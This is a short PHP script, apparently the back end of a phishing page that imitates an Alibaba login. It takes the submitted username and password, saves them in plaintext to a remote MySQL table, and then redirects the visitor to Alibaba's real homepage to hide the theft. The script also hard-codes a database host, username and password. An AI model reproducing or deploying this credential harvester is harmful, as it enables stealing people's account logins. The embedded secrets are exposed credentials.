<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve the username (loginId) and password from the form
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Database connection parameters
    $dbHost = "mydatabase.cgsakw3yfikm.us-east-1.rds.amazonaws.com";
    $dbUsername = "admin";
    $dbPassword = "Ultimateunique1";
    $dbName = "mydatabase";

    // Create a database connection
    $conn = new mysqli($dbHost, $dbUsername, $dbPassword, $dbName);

    // Check if the connection was successful
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }

    // Prepare and execute an SQL query to insert the login data
    $sql = "INSERT INTO login_data (username, password) VALUES (?, ?)";
    $stmt = $conn->prepare($sql);

    if ($stmt) {
        $stmt->bind_param("ss", $username, $password);
        if ($stmt->execute()) {
            // Redirect to the Alibaba official homepage
            header("Location: https://www.alibaba.com/");
            exit; // Ensure no further code is executed after the redirect
        } else {
            echo "Error inserting data into the database: " . $stmt->error;
        }
        $stmt->close();
    } else {
        echo "Error preparing the SQL statement: " . $conn->error;
    }

    // Close the database connection
    $conn->close();
} else {
    echo "Invalid request.";
}
?>
